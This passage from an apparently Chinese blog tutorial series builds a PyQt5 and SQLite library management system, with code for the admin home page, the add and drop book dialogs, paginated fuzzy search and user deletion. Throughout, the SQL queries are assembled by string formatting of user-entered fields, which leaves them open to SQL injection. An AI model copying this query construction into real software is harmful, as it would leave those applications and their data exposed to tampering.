addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked) addDialog.show() addDialog.exec_() def dropBookButtonClicked(self): dropDialog = dropBookDialog(self) dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked) dropDialog.show() dropDialog.exec_() def userManage(self): UserDelete=UserManage(self) UserDelete.show() UserDelete.exec_()if __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = AdminHome() mainMindow.show() sys.exit(app.exec_())整段代码非常简短，逻辑也很清晰。1、在setUpUI中有一个淘汰的button，一个添加的button2、使用信号与槽机制，当点击添加按钮时，启用addBookDialog，点击淘汰按钮时，启用dropBookDialog3、主页还有一个BookStorageViewer用于查看库存**注意：**两个diolog和一个Table，我会在接下来的blog中给出效果#虽然代码还不全，但也先看看最后效果吧~最后附上链接#项目地址：github仓库链接","link":"/a8b56f4b.html"},{"title":"PyQt5搭建图书馆管理系统（5）——添加&#x2F;淘汰书籍对话框设计","text":"分析：#在图书管管理系统主页上，我们有添加和淘汰的功能 ，通过按钮弹出对话框进行添加和淘汰书籍，这里我们就来完成一下这两个功能。添加图书功能#添加图书，需要管理员添加以下信息书名书号作者名分类（分类已经规定，只需要选择对应的种类就可以了）出版社出版日期添加的数量添加图书对话框代码#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstyleimport timefrom PyQt5.QtSql import *class addBookDialog(QDialog): add_book_success_signal = pyqtSignal() def __init__(self, parent=None): super(addBookDialog, self).__init__(parent) self.setUpUI() self.setWindowModality(Qt.WindowModal) self.setWindowTitle(&quot;添加书籍&quot;) def setUpUI(self): # 书名，书号，作者，分类，添加数量.出版社,出版日期 # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类 BookCategory = [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot; , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;] self.resize(300, 400) self.layout = QFormLayout() self.setLayout(self.layout) # Label控件 self.titlelabel = QLabel(&quot; 添加书籍&quot;) self.bookNameLabel = QLabel(&quot;书 名:&quot;) self.bookIdLabel = QLabel(&quot;书 号:&quot;) self.authNameLabel = QLabel(&quot;作 者:&quot;) self.categoryLabel = QLabel(&quot;分 类:&quot;) self.publisherLabel = QLabel(&quot;出 版 社:&quot;) self.publishDateLabel = QLabel(&quot;出版日期:&quot;) self.addNumLabel = QLabel(&quot;数 量:&quot;) # button控件 self.addBookButton = QPushButton(&quot;添 加&quot;) # lineEdit控件 self.bookNameEdit = QLineEdit() self.bookIdEdit = QLineEdit() self.authNameEdit = QLineEdit() self.categoryComboBox = QComboBox() self.categoryComboBox.addItems(BookCategory) self.publisherEdit = QLineEdit() self.publishTime = QDateTimeEdit() self.publishTime.setDisplayFormat(&quot;yyyy-MM-dd&quot;) # self.publishDateEdit = QLineEdit() self.addNumEdit = QLineEdit() self.bookNameEdit.setMaxLength(10) self.bookIdEdit.setMaxLength(6) self.authNameEdit.setMaxLength(10) self.publisherEdit.setMaxLength(10) self.addNumEdit.setMaxLength(12) self.addNumEdit.setValidator(QIntValidator()) # 添加进formlayout self.layout.addRow(&quot;&quot;, self.titlelabel) self.layout.addRow(self.bookNameLabel, self.bookNameEdit) self.layout.addRow(self.bookIdLabel, self.bookIdEdit) self.layout.addRow(self.authNameLabel, self.authNameEdit) self.layout.addRow(self.categoryLabel, self.categoryComboBox) self.layout.addRow(self.publisherLabel, self.publisherEdit) self.layout.addRow(self.publishDateLabel, self.publishTime) self.layout.addRow(self.addNumLabel, self.addNumEdit) self.layout.addRow(&quot;&quot;, self.addBookButton) # 设置字体 font = QFont() font.setPixelSize(20) self.titlelabel.setFont(font) font.setPixelSize(14) self.bookNameLabel.setFont(font) self.bookIdLabel.setFont(font) self.authNameLabel.setFont(font) self.categoryLabel.setFont(font) self.publisherLabel.setFont(font) self.publishDateLabel.setFont(font) self.addNumLabel.setFont(font) self.bookNameEdit.setFont(font) self.bookIdEdit.setFont(font) self.authNameEdit.setFont(font) self.publisherEdit.setFont(font) self.publishTime.setFont(font) self.categoryComboBox.setFont(font) self.addNumEdit.setFont(font) # button设置 font.setPixelSize(16) self.addBookButton.setFont(font) self.addBookButton.setFixedHeight(32) self.addBookButton.setFixedWidth(140) # 设置间距 self.titlelabel.setMargin(8) self.layout.setVerticalSpacing(10) self.addBookButton.clicked.connect(self.addBookButtonCicked) def addBookButtonCicked(self): bookName = self.bookNameEdit.text() bookId = self.bookIdEdit.text() authName = self.authNameEdit.text() bookCategory = self.categoryComboBox.currentText() publisher = self.publisherEdit.text() publishTime = self.publishTime.text() addBookNum = self.addNumEdit.text() if ( bookName == &quot;&quot; or bookId == &quot;&quot; or authName == &quot;&quot; or bookCategory == &quot;&quot; or publisher == &quot;&quot; or publishTime == &quot;&quot; or addBookNum == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;有字段为空，添加失败&quot;, QMessageBox.Yes, QMessageBox.Yes)) return else: addBookNum = int(addBookNum) db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() # 如果已存在，则update Book表的现存量，剩余可借量，不存在，则insert Book表，同时insert buyordrop表 sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % (bookId) query.exec_(sql) if (query.next()): sql = &quot;UPDATE Book SET NumStorage=NumStorage+%d,NumCanBorrow=NumCanBorrow+%d WHERE BookId='%s'&quot; % ( addBookNum, addBookNum, bookId) else: sql = &quot;INSERT INTO book VALUES ('%s','%s','%s','%s','%s','%s',%d,%d,0)&quot; % ( bookName, bookId, authName, bookCategory, publisher, publishTime, addBookNum, addBookNum) query.exec_(sql) db.commit() # 插入droporinsert表 timenow = time.strftime('%Y-%m-%d', time.localtime(time.time())) sql = &quot;INSERT INTO buyordrop VALUES ('%s','%s',1,%d)&quot; % (bookId, timenow, addBookNum) query.exec_(sql) db.commit() print(QMessageBox.information(self, &quot;提示&quot;, &quot;添加书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.add_book_success_signal.emit() self.close() self.clearEdit() return def clearEdit(self): self.bookNameEdit.clear() self.bookIdEdit.clear() self.authNameEdit.clear() self.addNumEdit.clear() self.publisherEdit.clear()if __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = addBookDialog() mainMindow.show() sys.exit(app.exec_())对于分类，使用了 QComboBox对于时间，选择了QDateTimeEdit，并且规定了时间的格式在setUpUI中可以看到，当点击添加图书按钮时addBookButtonClicked函数addBookButtonClicked函数实现逻辑#虽然我注释了，但是这里还是想重新写一下，逻辑如下如果存在有空值，警告添加的书已存在，就直接加上本数本来不存在，则开始插入数据实现效果:#淘汰图书功能#分析#从实现看与添加图书差不多，但是为了方便，我只允许管理员添加书本号，然后自动匹配到书籍信息填充，管理员只需再添加一个淘汰数量就行了代码#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstylefrom PyQt5.QtSql import *import timeclass dropBookDialog(QDialog): drop_book_successful_signal=pyqtSignal() def __init__(self, parent=None): super(dropBookDialog, self).__init__(parent) self.setUpUI() self.setWindowModality(Qt.WindowModal) self.setWindowTitle(&quot;删除书籍&quot;) def setUpUI(self): # 书名，书号，作者，分类，添加数量.出版社,出版日期 # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类 BookCategory = [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot; , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;] self.resize(300, 400) self.layout = QFormLayout() self.setLayout(self.layout) # Label控件 self.titlelabel = QLabel(&quot; 淘汰书籍&quot;) self.bookNameLabel = QLabel(&quot;书 名:&quot;) self.bookIdLabel = QLabel(&quot;书 号:&quot;) self.authNameLabel = QLabel(&quot;作 者:&quot;) self.categoryLabel = QLabel(&quot;分 类:&quot;) self.publisherLabel = QLabel(&quot;出 版 社:&quot;) self.publishDateLabel = QLabel(&quot;出版日期:&quot;) self.dropNumLabel = QLabel(&quot;数 量:&quot;) # button控件 self.dropBookButton = QPushButton(&quot;淘 汰&quot;) # lineEdit控件 self.bookNameEdit = QLineEdit() self.bookIdEdit = QLineEdit() self.authNameEdit = QLineEdit() self.categoryComboBox = QComboBox() self.categoryComboBox.addItems(BookCategory) self.publisherEdit = QLineEdit() self.publishTime = QLineEdit() # self.publishDateEdit = QLineEdit() self.dropNumEdit = QLineEdit() self.bookNameEdit.setMaxLength(10) self.bookIdEdit.setMaxLength(6) self.authNameEdit.setMaxLength(10) self.publisherEdit.setMaxLength(10) self.dropNumEdit.setMaxLength(12) self.dropNumEdit.setValidator(QIntValidator()) # 添加进formlayout self.layout.addRow(&quot;&quot;, self.titlelabel) self.layout.addRow(self.bookNameLabel, self.bookNameEdit) self.layout.addRow(self.bookIdLabel, self.bookIdEdit) self.layout.addRow(self.authNameLabel, self.authNameEdit) self.layout.addRow(self.categoryLabel, self.categoryComboBox) self.layout.addRow(self.publisherLabel, self.publisherEdit) self.layout.addRow(self.publishDateLabel, self.publishTime) self.layout.addRow(self.dropNumLabel, self.dropNumEdit) self.layout.addRow(&quot;&quot;, self.dropBookButton) # 设置字体 font = QFont() font.setPixelSize(20) self.titlelabel.setFont(font) font.setPixelSize(14) self.bookNameLabel.setFont(font) self.bookIdLabel.setFont(font) self.authNameLabel.setFont(font) self.categoryLabel.setFont(font) self.publisherLabel.setFont(font) self.publishDateLabel.setFont(font) self.dropNumLabel.setFont(font) self.bookNameEdit.setFont(font) self.bookNameEdit.setReadOnly(True) self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.bookIdEdit.setFont(font) self.authNameEdit.setFont(font) self.authNameEdit.setReadOnly(True) self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publisherEdit.setFont(font) self.publisherEdit.setReadOnly(True) self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publishTime.setFont(font) self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;) self.categoryComboBox.setFont(font) self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;) self.dropNumEdit.setFont(font) # button设置 font.setPixelSize(16) self.dropBookButton.setFont(font) self.dropBookButton.setFixedHeight(32) self.dropBookButton.setFixedWidth(140) # 设置间距 self.titlelabel.setMargin(8) self.layout.setVerticalSpacing(10) self.dropBookButton.clicked.connect(self.dropBookButtonClicked) self.bookIdEdit.textChanged.connect(self.bookIdEditChanged) def bookIdEditChanged(self): bookId = self.bookIdEdit.text() if (bookId == &quot;&quot;): self.bookNameEdit.clear() self.publisherEdit.clear() self.authNameEdit.clear() self.dropNumEdit.clear() self.publishTime.clear() db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % (bookId) query.exec_(sql) # 查询对应书号，如果存在就更新form if (query.next()): self.bookNameEdit.setText(query.value(0)) self.authNameEdit.setText(query.value(2)) self.categoryComboBox.setCurrentText(query.value(3)) self.publisherEdit.setText(query.value(4)) self.publishTime.setText(query.value(5)) return def dropBookButtonClicked(self): bookId = self.bookIdEdit.text() dropNum = 0 if (self.dropNumEdit.text() == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;淘汰数目为空，请检查输入，操作失败&quot;), QMessageBox.Yes, QMessageBox.Yes) return dropNum = int(self.dropNumEdit.text()) db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % (bookId) query.exec_(sql) if (query.next()): if (dropNum &gt; query.value(7) or dropNum &lt; 0): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;最多可淘汰%d本，请检查输入&quot; % (query.value(7)), QMessageBox.Yes, QMessageBox.Yes)) return # 更新Book表和BuyorDrop表 # 如果drop书目和当前库存相同，则直接删除Book记录（这里先默认当前所有书都在库存中） if (dropNum == query.value(6)): sql = &quot;DELETE FROM Book WHERE BookId='%s'&quot; % (bookId) else: sql = &quot;UPDATE BOOK SET NumStorage=NumStorage-%d,NumCanBorrow=NumCanBorrow-%d WHERE BookId='%s'&quot; % ( dropNum, dropNum, bookId) query.exec_(sql) db.commit() timenow = time.strftime('%Y-%m-%d', time.localtime(time.time())) sql = &quot;INSERT INTO buyordrop VALUES ('%s','%s',0,%d)&quot; % (bookId, timenow, dropNum) query.exec_(sql) db.commit() print(QMessageBox.information(self, &quot;提示&quot;, &quot;淘汰书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.drop_book_successful_signal.emit() self.close() returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = dropBookDialog() mainMindow.show() sys.exit(app.exec_())可以看到里面有两个函数，bookIdEditChanged和dropBookButtonClicked其中bookIdEditChanged用来实现实时监测是否填充信息dropBookButtonClicked实现点击淘汰的逻辑当监测到书号的 QLineEdit被更改时触发bookIdEditChanged，从数据库检查是否存在该书，如果有则添加实现效果#最后附上链接#项目地址：github仓库链接","link":"/65cd36fc.html"},{"title":"PyQt5搭建图书馆管理系统（6）——书籍信息查询实现","text":"分析#从数据库的设计可以看到，在这里我们只需要使用Book表的数据，就可以实现书籍信息的查询了在这个功能的实现上，可以说花了我比较大的心思了，主要实现了这些功能：动态刷新，也就是说当管理员删除或者添加书籍，用户借阅归还书籍的时候动态刷新这个TableView模糊匹配按书名，作者，书号，出版社查询跳转页，翻页代码实现#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248# -*- coding: utf-8 -*-import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import Qtimport qdarkstylefrom PyQt5.QtSql import *class BookStorageViewer(QWidget): def __init__(self): super(BookStorageViewer, self).__init__() self.resize(700, 500) self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;) # 查询模型 self.queryModel = None # 数据表 self.tableView = None # 当前页 self.currentPage = 0 # 总页数 self.totalPage = 0 # 总记录数 self.totalRecord = 0 # 每页数据数 self.pageRecord = 10 self.setUpUI() def setUpUI(self): self.layout = QVBoxLayout() self.Hlayout1 = QHBoxLayout() self.Hlayout2 = QHBoxLayout() # Hlayout1控件的初始化 self.searchEdit = QLineEdit() self.searchEdit.setFixedHeight(32) font = QFont() font.setPixelSize(15) self.searchEdit.setFont(font) self.searchButton = QPushButton(&quot;查询&quot;) self.searchButton.setFixedHeight(32) self.searchButton.setFont(font) self.searchButton.setIcon(QIcon(QPixmap(&quot;./images/search.png&quot;))) self.condisionComboBox = QComboBox() searchCondision = ['按书名查询', '按书号查询', '按作者查询', '按分类查询', '按出版社查询'] self.condisionComboBox.setFixedHeight(32) self.condisionComboBox.setFont(font) self.condisionComboBox.addItems(searchCondision) self.Hlayout1.addWidget(self.searchEdit) self.Hlayout1.addWidget(self.searchButton) self.Hlayout1.addWidget(self.condisionComboBox) # Hlayout2初始化 self.jumpToLabel = QLabel(&quot;跳转到第&quot;) self.pageEdit = QLineEdit() self.pageEdit.setFixedWidth(30) s = &quot;/&quot; + str(self.totalPage) + &quot;页&quot; self.pageLabel = QLabel(s) self.jumpToButton = QPushButton(&quot;跳转&quot;) self.prevButton = QPushButton(&quot;前一页&quot;) self.prevButton.setFixedWidth(60) self.backButton = QPushButton(&quot;后一页&quot;) self.backButton.setFixedWidth(60) Hlayout = QHBoxLayout() Hlayout.addWidget(self.jumpToLabel) Hlayout.addWidget(self.pageEdit) Hlayout.addWidget(self.pageLabel) Hlayout.addWidget(self.jumpToButton) Hlayout.addWidget(self.prevButton) Hlayout.addWidget(self.backButton) widget = QWidget() widget.setLayout(Hlayout) widget.setFixedWidth(300) self.Hlayout2.addWidget(widget) # tableView # 序号，书名，书号，作者，分类，出版社，出版时间，库存，剩余可借 self.db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) self.db.setDatabaseName('./db/LibraryManagement.db') self.db.open() self.tableView = QTableView() self.tableView.horizontalHeader().setStretchLastSection(True) self.tableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) self.tableView.setEditTriggers(QAbstractItemView.NoEditTriggers) self.queryModel = QSqlQueryModel() self.searchButtonClicked() self.tableView.setModel(self.queryModel) self.queryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;) self.queryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;) self.queryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;) self.queryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;) self.queryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;) self.queryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;) self.queryModel.setHeaderData(6, Qt.Horizontal, &quot;库存&quot;) self.queryModel.setHeaderData(7, Qt.Horizontal, &quot;剩余可借&quot;) self.queryModel.setHeaderData(8, Qt.Horizontal, &quot;总借阅次数&quot;) self.layout.addLayout(self.Hlayout1) self.layout.addWidget(self.tableView) self.layout.addLayout(self.Hlayout2) self.setLayout(self.layout) self.searchButton.clicked.connect(self.searchButtonClicked) self.prevButton.clicked.connect(self.prevButtonClicked) self.backButton.clicked.connect(self.backButtonClicked) self.jumpToButton.clicked.connect(self.jumpToButtonClicked) self.searchEdit.returnPressed.connect(self.searchButtonClicked) def setButtonStatus(self): if(self.currentPage==self.totalPage): self.prevButton.setEnabled(True) self.backButton.setEnabled(False) if(self.currentPage==1): self.backButton.setEnabled(True) self.prevButton.setEnabled(False) if(self.currentPage&lt;self.totalPage and self.currentPage&gt;1): self.prevButton.setEnabled(True) self.backButton.setEnabled(True) # 得到记录数 def getTotalRecordCount(self): self.queryModel.setQuery(&quot;SELECT * FROM Book&quot;) self.totalRecord = self.queryModel.rowCount() return # 得到总页数 def getPageCount(self): self.getTotalRecordCount() # 上取整 self.totalPage = int((self.totalRecord + self.pageRecord - 1) / self.pageRecord) return # 分页记录查询 def recordQuery(self, index): queryCondition = &quot;&quot; conditionChoice = self.condisionComboBox.currentText() if (conditionChoice == &quot;按书名查询&quot;): conditionChoice = 'BookName' elif (conditionChoice == &quot;按书号查询&quot;): conditionChoice = 'BookId' elif (conditionChoice == &quot;按作者查询&quot;): conditionChoice = 'Auth' elif (conditionChoice == '按分类查询'): conditionChoice = 'Category' else: conditionChoice = 'Publisher' if (self.searchEdit.text() == &quot;&quot;): queryCondition = &quot;select * from Book&quot; self.queryModel.setQuery(queryCondition) self.totalRecord = self.queryModel.rowCount() self.totalPage = int((self.totalRecord + self.pageRecord - 1) / self.pageRecord) label = &quot;/&quot; + str(int(self.totalPage)) + &quot;页&quot; self.pageLabel.setText(label) queryCondition = (&quot;select * from Book ORDER BY %s limit %d,%d &quot; % (conditionChoice,index, self.pageRecord)) self.queryModel.setQuery(queryCondition) self.setButtonStatus() return # 得到模糊查询条件 temp = self.searchEdit.text() s = '%' for i in range(0, len(temp)): s = s + temp[i] + &quot;%&quot; queryCondition = (&quot;SELECT * FROM Book WHERE %s LIKE '%s' ORDER BY %s &quot; % ( conditionChoice, s,conditionChoice)) self.queryModel.setQuery(queryCondition) self.totalRecord = self.queryModel.rowCount() # 当查询无记录时的操作 if(self.totalRecord==0): print(QMessageBox.information(self,&quot;提醒&quot;,&quot;查询无记录&quot;,QMessageBox.Yes,QMessageBox.Yes)) queryCondition = &quot;select * from Book&quot; self.queryModel.setQuery(queryCondition) self.totalRecord = self.queryModel.rowCount() self.totalPage = int((self.totalRecord + self.pageRecord - 1) / self.pageRecord) label = &quot;/&quot; + str(int(self.totalPage)) + &quot;页&quot; self.pageLabel.setText(label) queryCondition = (&quot;select * from Book ORDER BY %s limit %d,%d &quot; % (conditionChoice,index, self.pageRecord)) self.queryModel.setQuery(queryCondition) self.setButtonStatus() return self.totalPage = int((self.totalRecord + self.pageRecord - 1) / self.pageRecord) label = &quot;/&quot; + str(int(self.totalPage)) + &quot;页&quot; self.pageLabel.setText(label) queryCondition = (&quot;SELECT * FROM Book WHERE %s LIKE '%s' ORDER BY %s LIMIT %d,%d &quot; % ( conditionChoice, s, conditionChoice,index, self.pageRecord)) self.queryModel.setQuery(queryCondition) self.setButtonStatus() return # 点击查询 def searchButtonClicked(self): self.currentPage = 1 self.pageEdit.setText(str(self.currentPage)) self.getPageCount() s = &quot;/&quot; + str(int(self.totalPage)) + &quot;页&quot; self.pageLabel.setText(s) index = (self.currentPage - 1) * self.pageRecord self.recordQuery(index) return # 向前翻页 def prevButtonClicked(self): self.currentPage -= 1 if (self.currentPage &lt;= 1): self.currentPage = 1 self.pageEdit.setText(str(self.currentPage)) index = (self.currentPage - 1) * self.pageRecord self.recordQuery(index) return # 向后翻页 def backButtonClicked(self): self.currentPage += 1 if (self.currentPage &gt;= int(self.totalPage)): self.currentPage = int(self.totalPage) self.pageEdit.setText(str(self.currentPage)) index = (self.currentPage - 1) * self.pageRecord self.recordQuery(index) return # 点击跳转 def jumpToButtonClicked(self): if (self.pageEdit.text().isdigit()): self.currentPage = int(self.pageEdit.text()) if (self.currentPage &gt; self.totalPage): self.currentPage = self.totalPage if (self.currentPage &lt;= 1): self.currentPage = 1 else: self.currentPage = 1 index = (self.currentPage - 1) * self.pageRecord self.pageEdit.setText(str(self.currentPage)) self.recordQuery(index) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = BookStorageViewer() mainMindow.show() sys.exit(app.exec_())代码分析#主要使用了 Qt自带的QTableView和QSqlQueryModel实现了查询和展示结果也有得到记录数，总页数，点击查询，跳转，前一页，后一页的函数，这些都很好看懂，同时还设置了按钮的可用性分页记录查询函数是这里面最主要的一个函数，首先看查询种类 ，分别有判断为空 ，模糊查询，查询无果的处理在跳转前有对输入数据的检测合法与否这里还没有实现动态刷新，因为这个功能是用其他部件信号传输实现的实现效果#最后附上链接#项目地址：github仓库链接","link":"/ec62120c.html"},{"title":"PyQt5搭建图书馆管理系统（7）——用户管理","text":"分析#对于用户管理，本来应该包含添加用户，删除用户等操作的，但是为了实现简单，添加用户就用注册代替了，所以所谓用户管理，只是实现了用户的删除操作为了删除用户的同时保护数据库的完整性和约束，需要进行以下操作从User表删除该用户将该用户所借阅的所有书籍全部归还代码实现#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstylefrom PyQt5.QtSql import *import timeimport sipclass UserManage(QDialog): def __init__(self,parent=None): super(UserManage, self).__init__(parent) self.resize(280, 400) self.layout = QVBoxLayout() self.setLayout(self.layout) self.setWindowTitle(&quot;管理用户&quot;) # 用户数 self.userCount = 0 self.oldDeleteId = &quot;&quot; self.oldDeleteName = &quot;&quot; self.deleteId = &quot;&quot; self.deleteName = &quot;&quot; self.setUpUI() def setUpUI(self): self.db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) self.db.setDatabaseName('./db/LibraryManagement.db') self.db.open() self.query = QSqlQuery() self.getResult() # 表格设置 self.tableWidget = QTableWidget() self.tableWidget.setRowCount(self.userCount) self.tableWidget.setColumnCount(2) self.tableWidget.setHorizontalHeaderLabels(['学号', '姓名']) # 不可编辑 self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers) # 标题可拉伸 self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) # 整行选中 self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows) self.layout.addWidget(self.tableWidget) self.setRows() self.deleteUserButton = QPushButton(&quot;删 除 用 户&quot;) hlayout = QHBoxLayout() hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter) self.widget = QWidget() self.widget.setLayout(hlayout) self.widget.setFixedHeight(48) font = QFont() font.setPixelSize(15) self.deleteUserButton.setFixedHeight(36) self.deleteUserButton.setFixedWidth(180) self.deleteUserButton.setFont(font) self.layout.addWidget(self.widget, Qt.AlignCenter) # 设置信号 self.deleteUserButton.clicked.connect(self.deleteUser) self.tableWidget.itemClicked.connect(self.getStudentInfo) def getResult(self): sql = &quot;SELECT StudentId,Name FROM User WHERE IsAdmin=0&quot; self.query.exec_(sql) self.userCount = 0; while (self.query.next()): self.userCount += 1; sql = &quot;SELECT StudentId,Name FROM User WHERE IsAdmin=0&quot; self.query.exec_(sql) def setRows(self): font = QFont() font.setPixelSize(14) for i in range(self.userCount): if (self.query.next()): StudentIdItem = QTableWidgetItem(self.query.value(0)) StudentNameItem = QTableWidgetItem(self.query.value(1)) StudentIdItem.setFont(font) StudentNameItem.setFont(font) StudentIdItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter) StudentNameItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter) self.tableWidget.setItem(i, 0, StudentIdItem) self.tableWidget.setItem(i, 1, StudentNameItem) return def getStudentInfo(self, item): row = self.tableWidget.currentIndex().row() self.tableWidget.verticalScrollBar().setSliderPosition(row) self.getResult() i = 0 while (self.query.next() and i != row): i = i + 1 self.oldDeleteId = self.deleteId self.oldDeleteName = self.deleteName self.deleteId = self.query.value(0) self.deleteName = self.query.value(1) def deleteUser(self): if (self.deleteId == &quot;&quot; and self.deleteName == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes)) return elif (self.deleteId == self.oldDeleteId and self.deleteName == self.oldDeleteName): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes)) return if (QMessageBox.information(self, &quot;提醒&quot;, &quot;删除用户:%s,%s\\n用户一经删除将无法恢复，是否继续?&quot; % (self.deleteId, self.deleteName), QMessageBox.Yes | QMessageBox.No, QMessageBox.No) == QMessageBox.No): return # 从User表删除用户 sql = &quot;DELETE FROM User WHERE StudentId='%s'&quot; % (self.deleteId) self.query.exec_(sql) self.db.commit() # 归还所有书籍 sql = &quot;SELECT * FROM User_Book WHERE StudentId='%s' AND BorrowState=1&quot; % self.deleteId self.query.exec_(sql) timenow = time.strftime('%Y-%m-%d', time.localtime(time.time())) updateQuery=QSqlQuery() while (self.query.next()): bookId=self.query.value(1) sql=&quot;UPDATE Book SET NumCanBorrow=NumCanBorrow+1 WHERE BookId='%s'&quot;% bookId updateQuery.exec_(sql) self.db.commit() sql=&quot;UPDATE User_Book SET ReturnTime='%s',BorrowState=0 WHERE StudentId='%s' AND BorrowState=1&quot;%(timenow,self.deleteId) self.query.exec_(sql) self.db.commit() print(QMessageBox.information(self,&quot;提醒&quot;,&quot;删除用户成功!&quot;,QMessageBox.Yes,QMessageBox.Yes)) self.updateUI() return def updateUI(self): self.getResult() self.layout.removeWidget(self.widget) self.layout.removeWidget(self.tableWidget) sip.delete(self.widget) sip.delete(self.tableWidget) # 表格设置 self.tableWidget = QTableWidget() self.tableWidget.setRowCount(self.userCount) self.tableWidget.setColumnCount(2) self.tableWidget.setHorizontalHeaderLabels(['学号', '姓名']) # 不可编辑 self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers) # 标题可拉伸 self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) # 整行选中 self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows) self.layout.addWidget(self.tableWidget) self.setRows() self.deleteUserButton = QPushButton(&quot;删 